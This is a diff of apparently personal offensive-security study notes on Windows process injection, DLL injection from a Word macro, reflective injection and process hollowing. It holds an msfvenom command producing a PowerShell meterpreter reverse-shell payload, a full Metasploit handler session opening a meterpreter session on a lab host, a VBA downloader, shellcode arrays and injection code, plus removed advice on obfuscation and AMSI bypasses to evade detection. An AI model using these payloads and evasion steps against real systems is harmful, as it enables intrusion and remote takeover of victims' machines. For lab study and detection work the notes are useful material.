@@ -90,33 +90,6 @@ byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
 
 ```
 
-### Exercises 
-
-### #2 
-Modify the code of the ExampleAssembly project in DotNetToJscript to create a Jscript file that executes the shellcode inside explorer.exe. Instead of hardcoding the process ID, which cannot be known remotely, use the Process.GetProcessByName method to resolve it dynamically.
-- convert to js
-```powershell
- .\DotNetToJScript.exe C:\users\dooley\source\repos\InjectToJscript\InjectToJscript\bin\x64\Release\InjectToJscript.dll --lang=jscript --ver=v4 -o injecttojs.js -c InjectToJscript.Class1
-```
-
-### \#3
-
-- Port the code from C# to PowerShell to allow process injection and shellcode execution from a Word macro through PowerShell. Remember that PowerShell is started as 32-bit, so instead of injecting into explorer.exe, start a 32-bit process such as Notepad and inject into that instead.
-- create revshell payload in powershell format
-```bash
- ❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=9001 EXITFUNC=thread -f ps1
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-No encoder specified, outputting raw payload
-Payload size: 375 bytes
-Final size of ps1 file: 1830 bytes
-```
-- injection named injection2.ps1
-
-### TODO:
-#### Extra Mile
-
-Process injection with _VirtualAllocEx_, _WriteProcessMemory_, and _CreateRemoteThread_ is considered a standard technique, but there are a few others to consider.
 
 The low-level native APIs _NtCreateSection_, _NtMapViewOfSection_, _NtUnMapViewOfSection_, and _NtClose_ in ntdll.dll can be used as alternatives to _VirtualAllocEx_ and _WriteProcessMemory_.
 
@@ -403,7 +376,7 @@ Although more complex, DLL injection can theoretically be performed using an MS 
 
 Here's a simplified concept:
 
-```vba
+```vb
 
 Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
 
@@ -420,13 +393,7 @@ End Sub
 
 ```
 
-### Important Notes:
 
-1. **Security Risks**: DLL injection, especially using methods like Word Macros, is highly risky and often used by malware. Any testing or development should be done in an isolated environment.
-   
-2. **Detection**: Modern security solutions often detect and block DLL injection attempts, especially when combined with scripting languages like VBA.
-
-3. **Legal and Ethical Considerations**: Always ensure you have proper authorization to test or use these techniques.
 
 - create payload and start web server
 ```bash
@@ -548,84 +515,6 @@ namespace Inject
 }
 ```
 
-```bash
-❯ msfconsole
-Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it 
-with setg RHOSTS x.x.x.x
-                                                  
-               .;lxO0KXXXK0Oxl:.
-           ,o0WMMMMMMMMMMMMMMMMMMKd,
-        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
-      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
-    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
-   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
-  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
- oMMMMMMMMMMx.                    dMMMMMMMMMMx
-.WMMMMMMMMM:                       :MMMMMMMMMM,
-xMMMMMMMMMo                         lMMMMMMMMMO
-NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
-MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
-NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
-xMMMMMMMMMd                        ,0MMMMMMMMMMK;
-.WMMMMMMMMMc                         'OMMMMMM0,
- lMMMMMMMMMMk.                         .kMMO'
-  dMMMMMMMMMMWd'                         ..
-   cWMMMMMMMMMMMNxc'.                ##########
-    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
-      ;0MMMMMMMMMMMMMMMo.          +:+
-        .dNMMMMMMMMMMMMo          +#++:++#+
-           'oOWMMMMMMMMo                +:+
-               .,cdkO0K;        :+:    :+:                                
-                                :::::::+:
-                      Metasploit
-
-       =[ metasploit v6.4.5-dev                           ]
-+ -- --=[ 2413 exploits - 1242 auxiliary - 423 post       ]
-+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
-+ -- --=[ 9 evasion                                       ]
-
-Metasploit Documentation: https://docs.metasploit.com/
-
-msf6 > use exploit/multi/handler 
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set lhost eth0
-lhost => eth0
-msf6 exploit(multi/handler) > set lport 443
-lport => 443
-msf6 exploit(multi/handler) > show options
-
-Payload options (generic/shell_reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  eth0             yes       The listen address (an interface may be specified)
-   LPORT  443              yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Wildcard Target
-
-
-
-View the full module info with the info, or info -d command.
-
-msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
-payload => windows/x64/meterpreter/reverse_https
-msf6 exploit(multi/handler) > run
-
-[*] Started HTTPS reverse handler on https://192.168.1.113:443
-[!] https://192.168.1.113:443 handling request from 192.168.1.141; (UUID: 7efb85gt) Without a database connected that payload UUID tracking will not work!
-[*] https://192.168.1.113:443 handling request from 192.168.1.141; (UUID: 7efb85gt) Staging x64 payload (202844 bytes) ...
-[!] https://192.168.1.113:443 handling request from 192.168.1.141; (UUID: 7efb85gt) Without a database connected that payload UUID tracking will not work!
-[*] Meterpreter session 1 opened (192.168.1.113:443 -> 192.168.1.141:59838) at 2024-05-27 13:12:38 -0400
-
-meterpreter > getuid
-Server username: COMMANDO\<user>
-
-```
 
 ## Reflective Dll Injection
 
@@ -733,16 +622,6 @@ $RemoteThread = [Kernel32]::CreateRemoteThread($ProcessHandle, [IntPtr]::Zero, 0
 
 7. **Wait and Clean Up**:
    - The script waits for the remote thread to finish execution, then closes the handles to the thread and the process.
-
-### **Advanced Considerations**
-
-1. **Stealth**: To avoid detection, avoid using `LoadLibraryA` and instead use manual mapping techniques that do not rely on standard Windows APIs.
-   
-2. **Obfuscation**: The PowerShell script and DLL can be obfuscated to evade detection by security tools.
-   
-3. **Payload Execution**: Instead of a message box, the injected DLL could perform more complex tasks, such as establishing a reverse shell, keylogging, or other forms of persistence.
-
-4. **Detection and Prevention**: Many security solutions monitor the creation of remote threads and suspicious API calls (e.g., `VirtualAllocEx`, `WriteProcessMemory`). Implementing AMSI (Antimalware Scan Interface) bypasses, or avoiding the use of standard Windows APIs can help avoid detection.
 
 ### **Additional Resources**
 
@@ -899,10 +778,6 @@ Security teams should be aware of these techniques and implement advanced monito
 - **Behavioral Analysis**: Monitoring for unusual memory allocation and thread creation patterns.
 - **Code Integrity Checks**: Using tools that can detect non-standard methods of code injection.
 - **Memory Scanning**: Regularly scanning process memory for anomalies, including suspicious sections or encoded strings.
-
-### **Conclusion**
-
-Manual mapping and obfuscation are powerful techniques used by attackers to evade detection and carry out code injection. Implementing these techniques requires a deep understanding of the Windows operating system and the PE file format, along with creative methods for obfuscating the intent and content of the payload.
 
 ## Process Hollowing
 
@@ -1210,9 +1085,6 @@ Security teams need to implement robust detection mechanisms to identify and mit
 
 4. **Event Logging**: Enable detailed logging of process creation events and any modifications to process memory, and correlate these with other suspicious activities.
 
-### **Conclusion**
-
-Process hollowing is a powerful technique for stealthily executing malicious code within a legitimate process, thereby evading detection. By combining process hollowing with obfuscation and anti-analysis techniques, attackers can create highly evasive malware. To defend against such techniques, security teams must implement multi-layered detection strategies that focus on both behavior and memory integrity.
 
 ### DotNetToJscript
 
